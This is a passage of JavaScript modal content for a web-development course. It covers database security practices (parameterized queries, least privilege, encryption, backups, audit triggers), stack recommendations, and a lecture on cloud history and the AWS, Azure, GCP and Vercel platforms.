await db.query(query, [email]);  // email is treated as DATA

// SAFE — ORM handles it
await prisma.user.findUnique({ where: { email } });
// Prisma/Drizzle always use parameterized queries</code></pre>
                    </div>
                `
            },
            'db-sec-leastpriv': {
                title: 'Least Privilege Principle',
                body: `
                    <p>Your application's database user should only have permissions it needs.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>-- Create a limited user for the app
CREATE USER app_user WITH PASSWORD 'secure_password';

-- Grant only necessary permissions
GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA public TO app_user;

-- NO DROP, CREATE, ALTER permissions
-- If app is compromised, damage is limited

-- For migrations, use a separate privileged user
CREATE USER migrations_user WITH PASSWORD '...';
GRANT ALL PRIVILEGES ON DATABASE myapp TO migrations_user;</code></pre>
                    </div>
                `
            },
            'db-sec-encrypt': {
                title: 'Encryption',
                body: `
                    <p>Encrypt data in transit (TLS) and at rest (disk encryption).</p>
                    <div class="modal-section">
                        <h4>In Transit</h4>
                        <div class="modal-code-block">
                            <pre class="modal-code"><code>// Connection string with SSL
postgresql://user:pass@host/db?sslmode=require

// Prisma
datasource db {
  url = env("DATABASE_URL")  // Include ?sslmode=require
}</code></pre>
                        </div>
                    </div>
                    <div class="modal-section">
                        <h4>Column-Level Encryption</h4>
                        <p>For sensitive fields (SSN, credit cards), encrypt before storing. Use pgcrypto extension or application-level encryption.</p>
                    </div>
                `
            },
            'db-sec-backup': {
                title: 'Backup Strategy',
                body: `
                    <p>A backup you've never tested is not a backup.</p>
                    <div class="modal-section">
                        <h4>Best Practices</h4>
                        <ul>
                            <li><strong>Automate</strong> — daily backups at minimum</li>
                            <li><strong>Test restores</strong> — monthly at minimum</li>
                            <li><strong>Off-site storage</strong> — different region/provider</li>
                            <li><strong>Point-in-time recovery</strong> — enable WAL archiving</li>
                            <li><strong>Encrypt backups</strong> — protect at rest</li>
                        </ul>
                    </div>
                `
            },
            'db-sec-audit': {
                title: 'Audit Logging',
                body: `
                    <p>Track who changed what and when — critical for compliance and debugging.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>-- PostgreSQL audit trigger
CREATE OR REPLACE FUNCTION audit_trigger()
RETURNS TRIGGER AS $$
BEGIN
  INSERT INTO audit_log (
    table_name, action, old_data, new_data,
    changed_by, changed_at
  ) VALUES (
    TG_TABLE_NAME, TG_OP,
    row_to_json(OLD), row_to_json(NEW),
    current_user, now()
  );
  RETURN NEW;
END;
$$ LANGUAGE plpgsql;

CREATE TRIGGER users_audit
AFTER INSERT OR UPDATE OR DELETE ON users
FOR EACH ROW EXECUTE FUNCTION audit_trigger();</code></pre>
                    </div>
                `
            },

            // Stack Recommendations
            'db-stack-startup': {
                title: 'Startup / MVP Stack',
                body: `
                    <p>Start simple. PostgreSQL handles more than you think.</p>
                    <div class="modal-section">
                        <h4>Recommended Stack</h4>
                        <ul>
                            <li><strong>PostgreSQL</strong> — your one database</li>
                            <li><strong>Prisma</strong> — type-safe queries</li>
                            <li><strong>Supabase or Neon</strong> — managed hosting</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Why This Works</h4>
                        <p>PostgreSQL can do full-text search (ts_vector), JSON (jsonb), geospatial (PostGIS), and handles thousands of concurrent connections. Add Redis only when you actually need caching.</p>
                    </div>
                `
            },
            'db-stack-realtime': {
                title: 'Real-time App Stack',
                body: `
                    <p>When you need instant updates and live features.</p>
                    <div class="modal-section">
                        <h4>Recommended Stack</h4>
                        <ul>
                            <li><strong>PostgreSQL</strong> — source of truth</li>
                            <li><strong>Redis</strong> — pub/sub, caching, sessions</li>
                            <li><strong>Socket.io / Pusher</strong> — WebSocket layer</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Flow</h4>
                        <p>Write to PostgreSQL → Publish event to Redis → Subscribers push to WebSockets → Users see instant updates</p>
                    </div>
                `
            },
            'db-stack-content': {
                title: 'Content Platform Stack',
                body: `
                    <p>For blogs, documentation, e-commerce with search.</p>
                    <div class="modal-section">
                        <h4>Recommended Stack</h4>
                        <ul>
                            <li><strong>PostgreSQL</strong> — users, orders, metadata</li>
                            <li><strong>Elasticsearch / Meilisearch</strong> — search index</li>
                            <li><strong>S3 / R2</strong> — images, videos, files</li>
                            <li><strong>CDN</strong> — serve static content globally</li>
                        </ul>
                    </div>
                `
            },
            'db-stack-analytics': {
                title: 'Analytics / BI Stack',
                body: `
                    <p>When you're aggregating large amounts of data.</p>
                    <div class="modal-section">
                        <h4>Recommended Stack</h4>
                        <ul>
                            <li><strong>ClickHouse</strong> — self-hosted, blazing fast</li>
                            <li><strong>BigQuery</strong> — serverless, pay per query</li>
                            <li><strong>Snowflake</strong> — enterprise, separation of storage/compute</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Pattern</h4>
                        <p>OLTP database (PostgreSQL) for operations → ETL pipeline → OLAP database for analytics. Don't run heavy analytics queries on your production database.</p>
                    </div>
                `
            },

            // =====================
            // CLOUD LECTURE MODALS
            // =====================

            'cloud-before': {
                title: 'Before Cloud (2005)',
                body: `
                    <p>Running a web application before cloud computing required significant upfront investment and ongoing maintenance.</p>
                    <div class="modal-section">
                        <h4>The Reality</h4>
                        <ul>
                            <li><strong>Capital Expenditure</strong> — Buy servers for peak load, pay for idle capacity</li>
                            <li><strong>Physical Space</strong> — Data center, cooling, power, security</li>
                            <li><strong>Team Required</strong> — Network engineers, sysadmins, security specialists</li>
                            <li><strong>Planning Horizon</strong> — Guess capacity 6-18 months in advance</li>
                            <li><strong>Scaling Pain</strong> — Traffic spike? Buy more hardware, wait weeks</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Fun Fact</h4>
                        <p>Amazon built AWS because they had massive infrastructure for holiday shopping peaks that sat idle most of the year. Why not rent it out?</p>
                    </div>
                `
            },
            'cloud-after': {
                title: 'With Cloud (Today)',
                body: `
                    <p>Cloud computing transformed infrastructure from a capital expense to an operational expense.</p>
                    <div class="modal-section">
                        <h4>Key Benefits</h4>
                        <ul>
                            <li><strong>Pay-as-you-go</strong> — Only pay for what you use, scale down to $0</li>
                            <li><strong>Instant Provisioning</strong> — Spin up servers in seconds, not weeks</li>
                            <li><strong>Global Reach</strong> — Deploy to any region with a few clicks</li>
                            <li><strong>Managed Services</strong> — Databases, queues, ML — all maintained for you</li>
                            <li><strong>Auto-scaling</strong> — Handle traffic spikes automatically</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>The Trade-off</h4>
                        <p>You trade control for convenience. At massive scale, cloud can be more expensive than owning hardware — but you need to be very large for this to matter.</p>
                    </div>
                `
            },
            'cloud-1999': {
                title: 'Salesforce (1999)',
                body: `
                    <p>Salesforce pioneered the Software-as-a-Service (SaaS) model, proving that enterprise software could run entirely in the browser.</p>
                    <div class="modal-section">
                        <h4>The Revolution</h4>
                        <ul>
                            <li><strong>No Installation</strong> — Just log in and use it</li>
                            <li><strong>Automatic Updates</strong> — Everyone gets new features simultaneously</li>
                            <li><strong>Subscription Model</strong> — Pay monthly instead of huge upfront licenses</li>
                            <li><strong>Multi-tenant</strong> — One codebase serves all customers</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Impact</h4>
                        <p>Marc Benioff's "No Software" campaign directly challenged traditional enterprise vendors. Today Salesforce is worth $200B+.</p>
                    </div>
                `
            },
            'cloud-2006': {
                title: 'AWS Launches (2006)',
                body: `
                    <p>Amazon Web Services launched EC2 (Elastic Compute Cloud) and S3 (Simple Storage Service), creating the modern cloud computing market.</p>
                    <div class="modal-section">
                        <h4>Why It Mattered</h4>
                        <ul>
                            <li><strong>EC2</strong> — Rent virtual servers by the hour</li>
                            <li><strong>S3</strong> — Unlimited storage, pay per GB</li>
                            <li><strong>APIs First</strong> — Everything programmable, infrastructure as code</li>
                            <li><strong>Self-Service</strong> — No sales calls, just sign up</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>The Startup Boom</h4>
                        <p>Suddenly a startup could launch with $0 infrastructure cost. Netflix, Airbnb, Pinterest, and countless others built on AWS. The barrier to entry collapsed.</p>
                    </div>
                `
            },
            'cloud-2008': {
                title: 'Google App Engine (2008)',
                body: `
                    <p>Google introduced Platform-as-a-Service (PaaS) — deploy code without thinking about servers at all.</p>
                    <div class="modal-section">
                        <h4>The PaaS Model</h4>
                        <ul>
                            <li><strong>Just Deploy Code</strong> — No server configuration</li>
                            <li><strong>Auto-scaling</strong> — Platform handles traffic spikes</li>
                            <li><strong>Managed Runtime</strong> — Python/Java environments maintained by Google</li>
                            <li><strong>Scale to Zero</strong> — Pay nothing when idle</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Trade-offs</h4>
                        <p>Early App Engine was restrictive — specific languages, no local files, vendor lock-in. But it proved the concept that developers shouldn't need to think about servers.</p>
                    </div>
                `
            },
            'cloud-2010': {
                title: 'Azure GA (2010)',
                body: `
                    <p>Microsoft Azure reached general availability, bringing enterprise credibility and Windows/.NET to the cloud.</p>
                    <div class="modal-section">
                        <h4>Microsoft's Bet</h4>
                        <ul>
                            <li><strong>Enterprise Trust</strong> — CIOs already knew Microsoft</li>
                            <li><strong>.NET Native</strong> — Run Windows workloads seamlessly</li>
                            <li><strong>Active Directory</strong> — Enterprise identity in the cloud</li>
                            <li><strong>Hybrid Story</strong> — On-prem to cloud migration path</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Satya's Transformation</h4>
                        <p>Under Satya Nadella (CEO 2014), Microsoft went all-in on cloud. Azure is now #2 globally and often #1 for enterprise.</p>
                    </div>
                `
            },
            'cloud-2014': {
                title: 'AWS Lambda (2014)',
                body: `
                    <p>Lambda introduced serverless computing — run code without provisioning or managing servers.</p>
                    <div class="modal-section">
                        <h4>The Serverless Model</h4>
                        <ul>
                            <li><strong>Function-level</strong> — Deploy individual functions, not apps</li>
                            <li><strong>Event-driven</strong> — Triggered by HTTP, queues, schedules</li>
                            <li><strong>Pay per invocation</strong> — Millisecond billing, $0 when idle</li>
                            <li><strong>No ops</strong> — AWS handles scaling, patching, everything</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>The Future</h4>
                        <p>Serverless enabled a new generation of platforms (Vercel, Netlify) that make deployment trivial. "Just push code" became reality.</p>
                    </div>
                `
            },
            'cloud-2020': {
                title: 'Edge & DX Era (2020+)',
                body: `
                    <p>A new wave of platforms prioritized developer experience and edge computing over raw infrastructure.</p>
                    <div class="modal-section">
                        <h4>The New Players</h4>
                        <ul>
                            <li><strong>Vercel</strong> — Frontend cloud, Next.js creators</li>
                            <li><strong>Supabase</strong> — Open source Firebase alternative</li>
                            <li><strong>Cloudflare</strong> — Workers, D1, R2 — edge everything</li>
                            <li><strong>Railway/Render</strong> — Simple full-stack hosting</li>
                            <li><strong>PlanetScale/Neon</strong> — Serverless databases</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Philosophy</h4>
                        <p>"Deploy in seconds, not hours. Git push is all you need." These platforms bet that DX is worth paying for.</p>
                    </div>
                `
            },

            // AWS Services
            'aws-ec2': {
                title: 'Amazon EC2',
                body: `
                    <p><strong>Elastic Compute Cloud</strong> — Virtual servers in the cloud, the foundation of AWS.</p>
                    <div class="modal-section">
                        <h4>Key Features</h4>
                        <ul>
                            <li><strong>Instance Types</strong> — From t3.micro (free tier) to p4d.24xlarge (8 GPUs)</li>
                            <li><strong>Spot Instances</strong> — Up to 90% discount for interruptible workloads</li>
                            <li><strong>Auto Scaling</strong> — Scale based on CPU, memory, custom metrics</li>
                            <li><strong>AMIs</strong> — Pre-configured machine images for quick launch</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>When to Use</h4>
                        <p>When you need full control over the server environment, long-running processes, or specific hardware requirements.</p>
                    </div>
                `
            },
            'aws-lambda': {
                title: 'AWS Lambda',
                body: `
                    <p><strong>Serverless compute</strong> — Run code without thinking about servers.</p>
                    <div class="modal-section">
                        <h4>How It Works</h4>
                        <ul>
                            <li><strong>Upload Code</strong> — Zip file or container image</li>
                            <li><strong>Configure Trigger</strong> — API Gateway, S3, SQS, schedule</li>
                            <li><strong>AWS Runs It</strong> — Scales automatically, 0 to millions</li>
                            <li><strong>Pay Per Use</strong> — $0.20 per 1M requests + duration</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Limits</h4>
                        <p>15 minute max runtime, 10GB memory max, cold starts (100-500ms). Great for APIs, webhooks, scheduled tasks.</p>
                    </div>
                `
            },
            'aws-ecs': {
                title: 'Amazon ECS/EKS',
                body: `
                    <p><strong>Container orchestration</strong> — Run Docker containers at scale.</p>
                    <div class="modal-section">
                        <h4>ECS vs EKS</h4>
                        <ul>
                            <li><strong>ECS</strong> — AWS-native, simpler, Fargate for serverless containers</li>
                            <li><strong>EKS</strong> — Managed Kubernetes, portable, more complex</li>
                            <li><strong>Fargate</strong> — No EC2 management, just define CPU/memory</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>When to Use</h4>
                        <p>When you have existing Docker workflows, need more control than Lambda, or want Kubernetes compatibility.</p>
                    </div>
                `
            },
            'aws-s3': {
                title: 'Amazon S3',
                body: `
                    <p><strong>Simple Storage Service</strong> — Unlimited object storage, 11 nines durability.</p>
                    <div class="modal-section">
                        <h4>Use Cases</h4>
                        <ul>
                            <li><strong>Static Assets</strong> — Images, videos, downloads</li>
                            <li><strong>Backups</strong> — Database dumps, archives</li>
                            <li><strong>Data Lake</strong> — Raw data for analytics</li>
                            <li><strong>Static Hosting</strong> — Host entire websites</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Storage Classes</h4>
                        <p>Standard (frequent access), Intelligent-Tiering (auto-optimize), Glacier (archive, minutes to hours retrieval).</p>
                    </div>
                `
            },
            'aws-ebs': {
                title: 'Amazon EBS',
                body: `
                    <p><strong>Elastic Block Store</strong> — Persistent block storage for EC2 instances.</p>
                    <div class="modal-section">
                        <h4>Types</h4>
                        <ul>
                            <li><strong>gp3</strong> — General purpose SSD, most workloads</li>
                            <li><strong>io2</strong> — High IOPS for databases</li>
                            <li><strong>st1</strong> — Throughput optimized HDD, big data</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Key Feature</h4>
                        <p>Snapshots for backup, can be shared across accounts/regions. Think of it as a virtual hard drive that persists independently of EC2.</p>
                    </div>
                `
            },
            'aws-rds': {
                title: 'Amazon RDS',
                body: `
                    <p><strong>Relational Database Service</strong> — Managed SQL databases.</p>
                    <div class="modal-section">
                        <h4>Supported Engines</h4>
                        <ul>
                            <li><strong>PostgreSQL</strong> — Most popular for new apps</li>
                            <li><strong>MySQL/MariaDB</strong> — WordPress, legacy apps</li>
                            <li><strong>Aurora</strong> — AWS-optimized, 5x faster</li>
                            <li><strong>SQL Server/Oracle</strong> — Enterprise workloads</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>What AWS Manages</h4>
                        <p>Provisioning, patching, backups, replication, failover. You manage schema and queries.</p>
                    </div>
                `
            },
            'aws-vpc': {
                title: 'Amazon VPC',
                body: `
                    <p><strong>Virtual Private Cloud</strong> — Isolated network for your AWS resources.</p>
                    <div class="modal-section">
                        <h4>Components</h4>
                        <ul>
                            <li><strong>Subnets</strong> — Public (internet) vs Private (internal)</li>
                            <li><strong>Security Groups</strong> — Instance-level firewall</li>
                            <li><strong>NACLs</strong> — Subnet-level firewall</li>
                            <li><strong>NAT Gateway</strong> — Private subnet internet access</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Why It Matters</h4>
                        <p>Default security posture — nothing is exposed unless you allow it. Database in private subnet = not reachable from internet.</p>
                    </div>
                `
            },
            'aws-cloudfront': {
                title: 'Amazon CloudFront',
                body: `
                    <p><strong>Content Delivery Network</strong> — Cache content at 450+ edge locations globally.</p>
                    <div class="modal-section">
                        <h4>Use Cases</h4>
                        <ul>
                            <li><strong>Static Assets</strong> — Images, CSS, JS from S3</li>
                            <li><strong>API Acceleration</strong> — Faster API responses</li>
                            <li><strong>Video Streaming</strong> — Live and on-demand</li>
                            <li><strong>DDoS Protection</strong> — Absorb attacks at edge</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Integration</h4>
                        <p>Works seamlessly with S3, EC2, Lambda@Edge. Handles SSL certificates automatically with ACM.</p>
                    </div>
                `
            },
            'aws-route53': {
                title: 'Amazon Route 53',
                body: `
                    <p><strong>DNS Service</strong> — Domain registration and routing.</p>
                    <div class="modal-section">
                        <h4>Features</h4>
                        <ul>
                            <li><strong>Domain Registration</strong> — Buy domains directly</li>
                            <li><strong>DNS Hosting</strong> — Authoritative DNS</li>
                            <li><strong>Health Checks</strong> — Route away from unhealthy endpoints</li>
                            <li><strong>Traffic Routing</strong> — Latency, geo, weighted, failover</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Why 53?</h4>
                        <p>DNS uses port 53. Classic AWS naming.</p>
                    </div>
                `
            },
            'aws-amplify': {
                title: 'AWS Amplify',
                body: `
                    <p><strong>Full-stack app platform</strong> — AWS's answer to Vercel/Firebase.</p>
                    <div class="modal-section">
                        <h4>Features</h4>
                        <ul>
                            <li><strong>Hosting</strong> — Git-based deploys, preview URLs</li>
                            <li><strong>Auth</strong> — Cognito integration</li>
                            <li><strong>API</strong> — GraphQL or REST, auto-generated</li>
                            <li><strong>Storage</strong> — S3 with easy client SDK</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Reality Check</h4>
                        <p>Good for simple apps, but Vercel/Supabase often have better DX. Amplify can feel over-engineered.</p>
                    </div>
                `
            },
            'aws-cognito': {
                title: 'Amazon Cognito',
                body: `
                    <p><strong>User authentication</strong> — Identity management for web/mobile apps.</p>
                    <div class="modal-section">
                        <h4>Features</h4>
                        <ul>
                            <li><strong>User Pools</strong> — User directory, signup/signin</li>
                            <li><strong>Identity Pools</strong> — Federated identities, AWS credentials</li>
                            <li><strong>OAuth/OIDC</strong> — Social login (Google, Facebook, etc.)</li>
                            <li><strong>MFA</strong> — SMS, TOTP, email verification</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Pricing</h4>
                        <p>50,000 MAUs free, then $0.0055/MAU. Can get expensive at scale.</p>
                    </div>
                `
            },
            'aws-apigw': {
                title: 'Amazon API Gateway',
                body: `
                    <p><strong>Managed API service</strong> — Create, publish, and manage APIs at scale.</p>
                    <div class="modal-section">
                        <h4>Types</h4>
                        <ul>
                            <li><strong>HTTP API</strong> — Simple, cheap, fastest ($1/million requests)</li>
                            <li><strong>REST API</strong> — Full features, caching, usage plans</li>
                            <li><strong>WebSocket API</strong> — Real-time, bidirectional</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Integration</h4>
                        <p>Connects to Lambda, EC2, any HTTP endpoint. Handles auth, throttling, caching.</p>
                    </div>
                `
            },

            // Azure
            'azure-enterprise': {
                title: 'Azure Enterprise Ready',
                body: `
                    <p>Azure's deep integration with Microsoft's enterprise stack makes it the default choice for many large organizations.</p>
                    <div class="modal-section">
                        <h4>Key Integrations</h4>
                        <ul>
                            <li><strong>Azure AD</strong> — Same identity for Windows, Office, Azure</li>
                            <li><strong>Office 365</strong> — SharePoint, Teams, Exchange integration</li>
                            <li><strong>Power Platform</strong> — Power BI, Power Apps, Power Automate</li>
                            <li><strong>Dynamics 365</strong> — CRM/ERP suite</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Enterprise Sales</h4>
                        <p>Azure benefits from existing Microsoft enterprise agreements. Bundled pricing, familiar vendor relationship.</p>
                    </div>
                `
            },
            'azure-hybrid': {
                title: 'Azure Hybrid Cloud',
                body: `
                    <p>Azure has the strongest story for organizations that need both on-premises and cloud infrastructure.</p>
                    <div class="modal-section">
                        <h4>Key Products</h4>
                        <ul>
                            <li><strong>Azure Arc</strong> — Manage on-prem, multi-cloud from Azure</li>
                            <li><strong>Azure Stack</strong> — Run Azure services in your data center</li>
                            <li><strong>ExpressRoute</strong> — Private connection to Azure</li>
                            <li><strong>Site Recovery</strong> — Disaster recovery to cloud</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Use Case</h4>
                        <p>Banks, healthcare, government — regulated industries that can't go full cloud but want cloud benefits.</p>
                    </div>
                `
            },
            'azure-ai': {
                title: 'Azure AI & OpenAI',
                body: `
                    <p>Microsoft's $10B investment in OpenAI gives Azure exclusive cloud access to GPT-4 and beyond.</p>
                    <div class="modal-section">
                        <h4>Azure OpenAI Service</h4>
                        <ul>
                            <li><strong>GPT-4, GPT-4 Turbo</strong> — Latest models with enterprise SLAs</li>
                            <li><strong>Content Filtering</strong> — Built-in safety guardrails</li>
                            <li><strong>Private Endpoints</strong> — Data doesn't leave your VNet</li>
                            <li><strong>Fine-tuning</strong> — Custom models on your data</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Copilot Everywhere</h4>
                        <p>Microsoft is embedding AI across GitHub Copilot, Microsoft 365 Copilot, Bing, and more. Azure is the backbone.</p>
                    </div>
                `
            },
            'azure-dotnet': {
                title: 'Azure for .NET',
                body: `
                    <p>Azure is the natural home for .NET applications — first-class support, best tooling.</p>
                    <div class="modal-section">
                        <h4>Why .NET Developers Love Azure</h4>
                        <ul>
                            <li><strong>Visual Studio Integration</strong> — Deploy from IDE</li>
                            <li><strong>Azure App Service</strong> — PaaS optimized for .NET</li>
                            <li><strong>Azure SQL</strong> — SQL Server fully managed</li>
                            <li><strong>Azure Functions</strong> — C# serverless</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>.NET Modernization</h4>
                        <p>.NET Core/6/7/8 runs great on Linux. Azure supports both Windows and Linux for .NET workloads.</p>
                    </div>
                `
            },

            // GCP
            'gcp-data': {
                title: 'GCP Data & Analytics',
                body: `
                    <p>Google's data infrastructure is unmatched — BigQuery alone processes exabytes daily.</p>
                    <div class="modal-section">
                        <h4>Key Services</h4>
                        <ul>
                            <li><strong>BigQuery</strong> — Serverless data warehouse, SQL at petabyte scale</li>
                            <li><strong>Dataflow</strong> — Stream and batch data processing</li>
                            <li><strong>Pub/Sub</strong> — Messaging at scale (like Kafka, managed)</li>
                            <li><strong>Looker</strong> — Business intelligence platform</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>BigQuery Magic</h4>
                        <p>Query terabytes in seconds, pay only for data scanned. No indexes, no tuning — just SQL. Nothing else comes close.</p>
                    </div>
                `
            },
            'gcp-ml': {
                title: 'GCP Machine Learning',
                body: `
                    <p>Google built TensorFlow and runs the world's largest ML infrastructure. GCP is ML-native.</p>
                    <div class="modal-section">
                        <h4>Key Services</h4>
                        <ul>
                            <li><strong>Vertex AI</strong> — Unified ML platform</li>
                            <li><strong>TPUs</strong> — Custom ML chips, faster than GPUs</li>
                            <li><strong>AutoML</strong> — Train models without code</li>
                            <li><strong>Gemini</strong> — Google's latest multimodal AI</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Open Source</h4>
                        <p>TensorFlow, JAX, Keras — all from Google. Run them anywhere, but GCP has first-class support.</p>
                    </div>
                `
            },
            'gcp-k8s': {
                title: 'GCP Kubernetes (GKE)',
                body: `
                    <p>Google invented Kubernetes and runs GKE with features years ahead of competitors.</p>
                    <div class="modal-section">
                        <h4>GKE Advantages</h4>
                        <ul>
                            <li><strong>Autopilot</strong> — Fully managed, pay per pod</li>
                            <li><strong>Multi-cluster</strong> — Manage clusters globally</li>
                            <li><strong>Release Channels</strong> — Automatic version management</li>
                            <li><strong>Anthos</strong> — Run GKE on-prem and multi-cloud</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Industry Standard</h4>
                        <p>Kubernetes is everywhere now, but GKE remains the gold standard for managed K8s.</p>
                    </div>
                `
            },
            'gcp-network': {
                title: 'GCP Global Network',
                body: `
                    <p>Google operates one of the world's largest private networks — same infrastructure as Search and YouTube.</p>
                    <div class="modal-section">
                        <h4>Network Tiers</h4>
                        <ul>
                            <li><strong>Premium Tier</strong> — Traffic on Google's network globally</li>
                            <li><strong>Standard Tier</strong> — Public internet, lower cost</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Why It Matters</h4>
                        <p>Premium tier means your traffic stays on Google's fiber, avoiding public internet congestion. Noticeably faster for global apps.</p>
                    </div>
                `
            },

            // Big Three Comparison
            'cloud-compare-breadth': {
                title: 'Service Breadth Comparison',
                body: `
                    <p>AWS has the widest selection of services, Azure is close, GCP is more focused.</p>
                    <div class="modal-section">
                        <h4>Service Count (Approximate)</h4>
                        <ul>
                            <li><strong>AWS</strong> — 200+ services, something for everything</li>
                            <li><strong>Azure</strong> — 150+ services, enterprise focus</li>
                            <li><strong>GCP</strong> — 100+ services, curated, less overlap</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Trade-off</h4>
                        <p>More services = more choice but more complexity. GCP's smaller catalog can be an advantage — less decision fatigue.</p>
                    </div>
                `
            },
            'cloud-compare-enterprise': {
                title: 'Enterprise Features',
                body: `
                    <p>Azure leads in enterprise due to Microsoft relationships, AWS is strong, GCP is catching up.</p>
                    <div class="modal-section">
                        <h4>Key Factors</h4>
                        <ul>
                            <li><strong>Identity</strong> — Azure AD dominates enterprise identity</li>
                            <li><strong>Compliance</strong> — All three have extensive certifications</li>
                            <li><strong>Support</strong> — Enterprise agreements, dedicated teams</li>
                            <li><strong>Hybrid</strong> — Azure has the best on-prem story</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Reality</h4>
                        <p>If you're a Microsoft shop, Azure is default. Otherwise, all three work for enterprise.</p>
                    </div>
                `
            },
            'cloud-compare-data': {
                title: 'Data & ML Comparison',
                body: `
                    <p>GCP leads in data/ML due to BigQuery and Google's AI heritage. AWS and Azure are competitive.</p>
                    <div class="modal-section">
                        <h4>Standout Services</h4>
                        <ul>
                            <li><strong>GCP</strong> — BigQuery (data), Vertex AI (ML), TPUs</li>
                            <li><strong>AWS</strong> — Redshift (data), SageMaker (ML), Bedrock (AI)</li>
                            <li><strong>Azure</strong> — Synapse (data), Azure ML, OpenAI</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Recommendation</h4>
                        <p>For pure analytics: GCP. For OpenAI access: Azure. For everything else: depends on existing stack.</p>
                    </div>
                `
            },
            'cloud-compare-pricing': {
                title: 'Pricing Comparison',
                body: `
                    <p>All three have complex pricing. GCP tends to be simpler with sustained use discounts.</p>
                    <div class="modal-section">
                        <h4>Pricing Models</h4>
                        <ul>
                            <li><strong>On-demand</strong> — Pay by the hour/second</li>
                            <li><strong>Reserved</strong> — Commit 1-3 years, save 30-60%</li>
                            <li><strong>Spot/Preemptible</strong> — Interruptible, save 60-90%</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>GCP Advantage</h4>
                        <p>Sustained use discounts automatic (no commitment), per-second billing, simpler egress pricing.</p>
                    </div>
                `
            },
            'cloud-compare-dx': {
                title: 'Developer Experience',
                body: `
                    <p>All three have steep learning curves. GCP is generally considered to have better documentation and console UX.</p>
                    <div class="modal-section">
                        <h4>Comparison</h4>
                        <ul>
                            <li><strong>AWS Console</strong> — Powerful but overwhelming</li>
                            <li><strong>Azure Portal</strong> — Improved, still complex</li>
                            <li><strong>GCP Console</strong> — Cleanest, best search</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Reality</h4>
                        <p>For great DX, look at the "new cloud" (Vercel, Supabase). Big Three prioritize features over simplicity.</p>
                    </div>
                `
            },

            // Complexity
            'cloud-complexity-deploy': {
                title: 'AWS Deployment Complexity',
                body: `
                    <p>Deploying a "simple" web app on AWS properly requires understanding many interconnected services.</p>
                    <div class="modal-section">
                        <h4>Why So Many Steps?</h4>
                        <ul>
                            <li><strong>Security by Default</strong> — Nothing exposed unless configured</li>
                            <li><strong>Flexibility</strong> — Every option is customizable</li>
                            <li><strong>Enterprise Grade</strong> — Built for complex requirements</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>The Trade-off</h4>
                        <p>Full control = full responsibility. Great for complex apps, overkill for a marketing site or MVP.</p>
                    </div>
                `
            },
            'cloud-simplicity-vercel': {
                title: 'Vercel Simplicity',
                body: `
                    <p>Vercel abstracts away all infrastructure decisions, giving you sensible defaults.</p>
                    <div class="modal-section">
                        <h4>What Happens on git push</h4>
                        <ul>
                            <li><strong>Build</strong> — Detects framework, runs build command</li>
                            <li><strong>Deploy</strong> — Uploads to global CDN edge</li>
                            <li><strong>SSL</strong> — Auto-provisions certificate</li>
                            <li><strong>DNS</strong> — Updates immediately</li>
                            <li><strong>Functions</strong> — API routes become serverless</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>The Trade-off</h4>
                        <p>Less control, but 99% of apps don't need that control. Ship now, migrate later if needed.</p>
                    </div>
                `
            },

            // Vercel
            'vercel-deploy': {
                title: 'Vercel Zero Config Deploy',
                body: `
                    <p>Vercel automatically detects your framework and configures everything.</p>
                    <div class="modal-section">
                        <h4>Supported Frameworks</h4>
                        <ul>
                            <li><strong>Next.js</strong> — First-class support (Vercel makes it)</li>
                            <li><strong>React/Vue/Svelte</strong> — Static or SSR</li>
                            <li><strong>Astro/Nuxt/Remix</strong> — Full support</li>
                            <li><strong>Static HTML</strong> — Just works</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <h4>Detection Magic</h4>
                        <p>Vercel reads package.json, detects Next.js/Vue/etc., sets build command, output directory, and Node version automatically.</p>
                    </div>
                `
            },
            'vercel-edge': {
                title: 'Vercel Edge Network',
                body: `
                    <p>Your app is deployed to 100+ locations globally, serving users from the nearest edge.</p>
                    <div class="modal-section">
                        <h4>Edge Benefits</h4>
                        <ul>
                            <li><strong>Latency</strong> — Content served from nearest location</li>
                            <li><strong>Reliability</strong> — No single point of failure</li>
